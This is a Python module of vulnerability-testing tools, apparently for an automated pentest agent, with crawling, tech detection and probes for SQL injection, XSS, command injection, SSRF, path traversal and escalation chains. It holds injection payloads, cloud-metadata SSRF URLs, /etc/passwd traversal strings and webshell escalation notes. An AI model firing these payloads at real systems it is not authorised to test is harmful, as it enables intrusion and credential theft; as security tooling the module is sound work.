"""
Offensive tools that wrap existing All-Hack scanners
"""

import aiohttp
from typing import List, Dict, Any
from urllib.parse import urlparse, urljoin

from .base import BaseTool, ToolParameter, ToolResult, ToolCategory


class CrawlTool(BaseTool):
    """Crawl target to discover endpoints"""

    @property
    def name(self) -> str:
        return "crawl"

    @property
    def description(self) -> str:
        return "Crawl a website to discover endpoints, forms, and parameters"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.RECON

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL to crawl", required=True),
            ToolParameter("depth", "int", "Crawl depth (1-5)", required=False, default=3),
            ToolParameter("max_pages", "int", "Maximum pages to crawl", required=False, default=100),
        ]

    async def execute(self, url: str, depth: int = 3, max_pages: int = 100, **kwargs) -> ToolResult:
        try:
            # Import the crawler module
            from app.modules.crawler import WebCrawler

            crawler = WebCrawler(max_depth=depth, max_pages=max_pages)
            result = await crawler.crawl(url)

            return ToolResult(
                success=True,
                data={
                    "endpoints": result.get("urls", []),
                    "forms": result.get("forms", []),
                    "parameters": result.get("parameters", []),
                    "total_pages": len(result.get("urls", []))
                },
                metadata={"depth": depth, "target": url}
            )
        except ImportError:
            # Fallback simple crawl
            return await self._simple_crawl(url, depth, max_pages)
        except Exception as e:
            return ToolResult(success=False, error=str(e))

    async def _simple_crawl(self, url: str, depth: int, max_pages: int) -> ToolResult:
        """Simple fallback crawler"""
        endpoints = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        # Extract links (basic)
                        import re
                        links = re.findall(r'href=["\']([^"\']+)["\']', text)
                        base = urlparse(url)
                        for link in links[:max_pages]:
                            if link.startswith("/"):
                                endpoints.append(urljoin(url, link))
                            elif link.startswith(f"{base.scheme}://{base.netloc}"):
                                endpoints.append(link)

            return ToolResult(
                success=True,
                data={"endpoints": list(set(endpoints)), "total_pages": len(endpoints)},
                metadata={"fallback": True}
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class TechDetectTool(BaseTool):
    """Detect technologies and frameworks"""

    @property
    def name(self) -> str:
        return "tech_detect"

    @property
    def description(self) -> str:
        return "Detect technologies, frameworks, and servers used by the target"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.RECON

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL", required=True),
        ]

    async def execute(self, url: str, **kwargs) -> ToolResult:
        technologies = []
        headers_info = {}

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    headers = dict(resp.headers)
                    headers_info = headers

                    # Server detection
                    if "Server" in headers:
                        technologies.append({"name": headers["Server"], "category": "server"})

                    # Framework detection from headers
                    if "X-Powered-By" in headers:
                        technologies.append({"name": headers["X-Powered-By"], "category": "framework"})

                    # Read body for more detection
                    body = await resp.text()

                    # WordPress
                    if "/wp-content/" in body or "/wp-includes/" in body:
                        technologies.append({"name": "WordPress", "category": "cms"})

                    # React
                    if "react" in body.lower() or "_reactRootContainer" in body:
                        technologies.append({"name": "React", "category": "frontend"})

                    # Vue
                    if "vue" in body.lower() or "__vue__" in body:
                        technologies.append({"name": "Vue.js", "category": "frontend"})

                    # PHP
                    if ".php" in body or "PHPSESSID" in str(headers):
                        technologies.append({"name": "PHP", "category": "backend"})

                    # ASP.NET
                    if "ASP.NET" in str(headers) or ".aspx" in body:
                        technologies.append({"name": "ASP.NET", "category": "backend"})

                    # Java
                    if "JSESSIONID" in str(headers):
                        technologies.append({"name": "Java", "category": "backend"})

                    # Nginx
                    if "nginx" in headers.get("Server", "").lower():
                        technologies.append({"name": "Nginx", "category": "webserver"})

                    # Apache
                    if "apache" in headers.get("Server", "").lower():
                        technologies.append({"name": "Apache", "category": "webserver"})

                    # WAF detection
                    waf_headers = ["X-WAF-", "X-Firewall", "X-CDN"]
                    for wh in waf_headers:
                        for h in headers:
                            if wh.lower() in h.lower():
                                technologies.append({"name": "WAF Detected", "category": "security"})
                                break

            return ToolResult(
                success=True,
                data={
                    "technologies": technologies,
                    "headers": headers_info
                },
                metadata={"url": url}
            )

        except Exception as e:
            return ToolResult(success=False, error=str(e))


class SQLiTool(BaseTool):
    """Test for SQL injection vulnerabilities"""

    @property
    def name(self) -> str:
        return "test_sqli"

    @property
    def description(self) -> str:
        return "Test parameters for SQL injection vulnerabilities (boolean, error, time-based)"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.EXPLOIT

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL with parameters", required=True),
            ToolParameter("parameter", "string", "Specific parameter to test (optional)", required=False),
            ToolParameter("methods", "array", "SQLi methods to try", required=False,
                         default=["boolean", "error", "time"]),
        ]

    async def execute(self, url: str, parameter: str = None, methods: list = None, **kwargs) -> ToolResult:
        findings = []
        methods = methods or ["boolean", "error", "time"]

        try:
            # Import SQLi scanner
            from app.scanners.owasp.sql_injection import SQLInjectionScanner

            scanner = SQLInjectionScanner()
            results = await scanner.scan(url, parameter=parameter)

            for vuln in results.get("vulnerabilities", []):
                findings.append({
                    "type": "sqli",
                    "severity": vuln.get("severity", "high"),
                    "title": f"SQL Injection in {vuln.get('parameter', 'unknown')}",
                    "url": url,
                    "parameter": vuln.get("parameter"),
                    "payload": vuln.get("payload"),
                    "evidence": vuln.get("evidence"),
                    "technique": vuln.get("technique")
                })

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings,
                metadata={"methods": methods}
            )

        except ImportError:
            # Fallback basic test
            return await self._basic_sqli_test(url, parameter)
        except Exception as e:
            return ToolResult(success=False, error=str(e))

    async def _basic_sqli_test(self, url: str, parameter: str = None) -> ToolResult:
        """Basic SQLi detection fallback"""
        findings = []
        payloads = ["'", "\"", "' OR '1'='1", "1 OR 1=1", "' AND '1'='1"]

        try:
            async with aiohttp.ClientSession() as session:
                # Get baseline
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    baseline = len(await resp.text())

                # Test payloads
                for payload in payloads:
                    test_url = f"{url}{payload}" if "?" in url else f"{url}?id={payload}"
                    try:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            body = await resp.text()

                            # Check for SQL errors
                            sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql", "oracle",
                                         "syntax error", "unclosed quotation"]
                            for err in sql_errors:
                                if err.lower() in body.lower():
                                    findings.append({
                                        "type": "sqli",
                                        "severity": "high",
                                        "title": "SQL Injection - Error Based",
                                        "url": test_url,
                                        "payload": payload,
                                        "evidence": f"SQL error detected: {err}"
                                    })
                                    break
                    except:
                        pass

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings,
                metadata={"fallback": True}
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class XSSTool(BaseTool):
    """Test for XSS vulnerabilities"""

    @property
    def name(self) -> str:
        return "test_xss"

    @property
    def description(self) -> str:
        return "Test for Cross-Site Scripting (XSS) vulnerabilities"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.EXPLOIT

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL", required=True),
            ToolParameter("parameter", "string", "Specific parameter to test", required=False),
            ToolParameter("contexts", "array", "XSS contexts to test", required=False,
                         default=["html", "attr", "js"]),
        ]

    async def execute(self, url: str, parameter: str = None, contexts: list = None, **kwargs) -> ToolResult:
        findings = []
        contexts = contexts or ["html", "attr", "js"]

        try:
            from app.scanners.owasp.xss_scanner import XSSScanner

            scanner = XSSScanner()
            results = await scanner.scan(url, parameter=parameter)

            for vuln in results.get("vulnerabilities", []):
                findings.append({
                    "type": "xss",
                    "severity": vuln.get("severity", "medium"),
                    "title": f"XSS in {vuln.get('parameter', 'unknown')}",
                    "url": url,
                    "parameter": vuln.get("parameter"),
                    "payload": vuln.get("payload"),
                    "context": vuln.get("context"),
                    "evidence": vuln.get("evidence")
                })

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings
            )

        except ImportError:
            return await self._basic_xss_test(url, parameter)
        except Exception as e:
            return ToolResult(success=False, error=str(e))

    async def _basic_xss_test(self, url: str, parameter: str = None) -> ToolResult:
        """Basic XSS detection fallback"""
        findings = []
        canary = "xss7e3m9k"
        payloads = [
            f"<script>{canary}</script>",
            f"<img src=x onerror={canary}>",
            f"'{canary}",
            f"\"{canary}"
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    test_url = f"{url}{payload}" if "?" in url else f"{url}?q={payload}"
                    try:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            body = await resp.text()
                            if canary in body:
                                findings.append({
                                    "type": "xss",
                                    "severity": "medium",
                                    "title": "Reflected XSS",
                                    "url": test_url,
                                    "payload": payload,
                                    "evidence": f"Canary '{canary}' reflected in response"
                                })
                                break
                    except:
                        pass

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings,
                metadata={"fallback": True}
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class RCETool(BaseTool):
    """Test for Remote Code Execution"""

    @property
    def name(self) -> str:
        return "test_rce"

    @property
    def description(self) -> str:
        return "Test for command injection and remote code execution vulnerabilities"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.EXPLOIT

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL", required=True),
            ToolParameter("parameter", "string", "Specific parameter to test", required=False),
        ]

    async def execute(self, url: str, parameter: str = None, **kwargs) -> ToolResult:
        findings = []

        try:
            from app.scanners.owasp.command_injection import CommandInjectionScanner

            scanner = CommandInjectionScanner()
            results = await scanner.scan(url, parameter=parameter)

            for vuln in results.get("vulnerabilities", []):
                findings.append({
                    "type": "rce",
                    "severity": "critical",
                    "title": f"Command Injection in {vuln.get('parameter', 'unknown')}",
                    "url": url,
                    "parameter": vuln.get("parameter"),
                    "payload": vuln.get("payload"),
                    "evidence": vuln.get("evidence")
                })

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings
            )

        except ImportError:
            return await self._basic_rce_test(url, parameter)
        except Exception as e:
            return ToolResult(success=False, error=str(e))

    async def _basic_rce_test(self, url: str, parameter: str = None) -> ToolResult:
        """Basic RCE detection using time-based technique"""
        findings = []
        delay_payloads = [
            ("; sleep 5", 5),
            ("| sleep 5", 5),
            ("|| sleep 5", 5),
            ("`sleep 5`", 5),
            ("$(sleep 5)", 5)
        ]

        try:
            async with aiohttp.ClientSession() as session:
                # Get baseline time
                import time
                start = time.time()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    await resp.text()
                baseline_time = time.time() - start

                # Test delay payloads
                for payload, expected_delay in delay_payloads:
                    test_url = f"{url}{payload}" if "?" in url else f"{url}?cmd={payload}"
                    try:
                        start = time.time()
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                            await resp.text()
                        elapsed = time.time() - start

                        if elapsed > baseline_time + (expected_delay - 1):
                            findings.append({
                                "type": "rce",
                                "severity": "critical",
                                "title": "Command Injection (Time-based)",
                                "url": test_url,
                                "payload": payload,
                                "evidence": f"Response delayed by {elapsed:.1f}s (expected {expected_delay}s)"
                            })
                            break
                    except:
                        pass

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings,
                metadata={"fallback": True}
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class SSRFTool(BaseTool):
    """Test for SSRF vulnerabilities"""

    @property
    def name(self) -> str:
        return "test_ssrf"

    @property
    def description(self) -> str:
        return "Test for Server-Side Request Forgery vulnerabilities"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.EXPLOIT

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL with URL parameter", required=True),
            ToolParameter("parameter", "string", "URL parameter name", required=False, default="url"),
        ]

    async def execute(self, url: str, parameter: str = "url", **kwargs) -> ToolResult:
        findings = []
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for payload in ssrf_payloads:
                    test_url = f"{url}?{parameter}={payload}"
                    try:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            body = await resp.text()

                            # Check for internal service responses
                            internal_indicators = [
                                "root:", "/etc/passwd", "ami-id", "instance-id",
                                "computeMetadata", "localhost", "127.0.0.1"
                            ]
                            for indicator in internal_indicators:
                                if indicator in body:
                                    findings.append({
                                        "type": "ssrf",
                                        "severity": "high",
                                        "title": "Server-Side Request Forgery",
                                        "url": test_url,
                                        "payload": payload,
                                        "evidence": f"Internal content detected: {indicator}"
                                    })
                                    break
                    except:
                        pass

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class LFITool(BaseTool):
    """Test for Local File Inclusion"""

    @property
    def name(self) -> str:
        return "test_lfi"

    @property
    def description(self) -> str:
        return "Test for Local File Inclusion / Path Traversal vulnerabilities"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.EXPLOIT

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL", required=True),
            ToolParameter("parameter", "string", "File parameter name", required=False, default="file"),
        ]

    async def execute(self, url: str, parameter: str = "file", **kwargs) -> ToolResult:
        findings = []
        lfi_payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("/etc/passwd", "root:"),
            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
            ("....\\\\....\\\\windows\\win.ini", "[fonts]"),
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for payload, indicator in lfi_payloads:
                    test_url = f"{url}?{parameter}={payload}"
                    try:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            body = await resp.text()

                            if indicator in body:
                                findings.append({
                                    "type": "lfi",
                                    "severity": "high",
                                    "title": "Local File Inclusion",
                                    "url": test_url,
                                    "payload": payload,
                                    "evidence": f"File content detected: {indicator}"
                                })
                                break
                    except:
                        pass

            return ToolResult(
                success=True,
                data={"tested": url, "vulnerable": len(findings) > 0},
                findings=findings
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class AuthTestTool(BaseTool):
    """Test authentication mechanisms"""

    @property
    def name(self) -> str:
        return "test_auth"

    @property
    def description(self) -> str:
        return "Test authentication mechanisms for vulnerabilities (default creds, bypass, etc.)"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.EXPLOIT

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL (login page)", required=True),
        ]

    async def execute(self, url: str, **kwargs) -> ToolResult:
        findings = []

        try:
            from app.modules.auth_testing import AuthTester

            tester = AuthTester()
            results = await tester.test(url)

            for vuln in results.get("vulnerabilities", []):
                findings.append({
                    "type": "auth",
                    "severity": vuln.get("severity", "high"),
                    "title": vuln.get("title", "Authentication Vulnerability"),
                    "url": url,
                    "evidence": vuln.get("evidence")
                })

            return ToolResult(
                success=True,
                data={"tested": url, "issues_found": len(findings)},
                findings=findings
            )

        except ImportError:
            return ToolResult(
                success=True,
                data={"tested": url, "issues_found": 0},
                metadata={"note": "Auth testing module not available"}
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class UnifiedScanTool(BaseTool):
    """Run comprehensive unified scan"""

    @property
    def name(self) -> str:
        return "unified_scan"

    @property
    def description(self) -> str:
        return "Run a comprehensive security scan covering all vulnerability types"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.SCAN

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("url", "string", "Target URL", required=True),
            ToolParameter("depth", "string", "Scan depth", required=False,
                         default="balanced", enum=["quick", "balanced", "deep"]),
        ]

    async def execute(self, url: str, depth: str = "balanced", **kwargs) -> ToolResult:
        try:
            from app.unified_scanner import UnifiedScanner

            scanner = UnifiedScanner()
            results = await scanner.scan(url, depth=depth)

            findings = results.get("findings", [])

            return ToolResult(
                success=True,
                data={
                    "target": url,
                    "depth": depth,
                    "total_findings": len(findings),
                    "by_severity": results.get("severity_counts", {})
                },
                findings=findings,
                metadata={"scan_id": results.get("scan_id")}
            )

        except Exception as e:
            return ToolResult(success=False, error=str(e))


class ChainAnalysisTool(BaseTool):
    """Analyze and chain vulnerabilities"""

    @property
    def name(self) -> str:
        return "chain_analysis"

    @property
    def description(self) -> str:
        return "Analyze discovered vulnerabilities for exploitation chains and escalation paths"

    @property
    def category(self) -> ToolCategory:
        return ToolCategory.ANALYSIS

    @property
    def parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter("findings", "array", "List of findings to analyze", required=False),
        ]

    async def execute(self, findings: list = None, **kwargs) -> ToolResult:
        chains = []
        findings = findings or []

        # Chain detection rules
        chain_patterns = [
            {
                "name": "SQLi to RCE",
                "requires": ["sqli"],
                "leads_to": "rce",
                "technique": "INTO OUTFILE + webshell"
            },
            {
                "name": "SSRF to Cloud Metadata",
                "requires": ["ssrf"],
                "leads_to": "cloud_compromise",
                "technique": "Access IMDSv1/v2 endpoints"
            },
            {
                "name": "LFI to RCE",
                "requires": ["lfi"],
                "leads_to": "rce",
                "technique": "Log poisoning or PHP wrappers"
            },
            {
                "name": "XSS to Account Takeover",
                "requires": ["xss"],
                "leads_to": "account_takeover",
                "technique": "Session hijacking or CSRF"
            }
        ]

        finding_types = set(f.get("type", "") for f in findings)

        for pattern in chain_patterns:
            if all(req in finding_types for req in pattern["requires"]):
                chains.append({
                    "chain_name": pattern["name"],
                    "starting_vuln": pattern["requires"],
                    "target": pattern["leads_to"],
                    "technique": pattern["technique"],
                    "confidence": "high" if len(pattern["requires"]) == 1 else "medium"
                })

        return ToolResult(
            success=True,
            data={
                "analyzed_findings": len(findings),
                "chains_found": len(chains),
                "chains": chains
            }
        )
